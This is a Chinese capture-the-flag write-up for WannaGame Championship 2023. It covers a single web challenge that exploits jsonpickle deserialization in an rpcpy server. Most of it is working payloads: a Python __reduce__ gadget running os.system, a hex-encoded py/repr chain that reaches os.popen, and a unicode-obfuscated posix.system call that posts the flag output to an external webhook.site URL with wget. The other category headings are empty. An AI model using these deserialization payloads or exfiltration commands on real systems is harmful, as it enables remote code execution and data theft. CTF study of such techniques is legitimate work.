https://nguyendt.hashnode.dev/wannagame-championship-2023
# web
### Bocchi The RPC Server
一个rpc服务器
rpcpy存在[漏洞](https://github.com/ehtec/rpcpy-exploit/)
但是payload里利用的是pickle,题目中注释掉了
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231206233250.png)


可以使用jsonpickle绕过,记得用linux!!
```python
from typing import Any
import requests

import jsonpickle


class PickleRce(object):
    def __reduce__(self):
        import os
        return os.system, ("whoami",)


# 序列化对象为JSON字符串
json_str=jsonpickle.encode(PickleRce())
print(json_str)

```

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231207000506.png)
然后unicode绕过

---

payload
```json
{
    "name": {
        "py/repr": "binascii/().__class__.__base__.__subclasses__().__getitem__(107).load_module(binascii.unhexlify('6f73').decode()).popen(binascii.unhexlify('2e2e2f72656164666c6167').decode()).read()"
    }
}
```

unicode绕过
```json
{
    "name": {
        "py/reduce": [
            {
                "py/function": "p\u006fsix.s\u0079stem"
            },
            {
                "py/tuple": [
                    "wget https://webhook.site/dfb8094f-ab17-41b5-93fa-e6c353fd4fbd --p\u006fst-data $(/readflag)"
                ]
            }
        ]
    }
}
```


### 

# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2023-12-06   22:26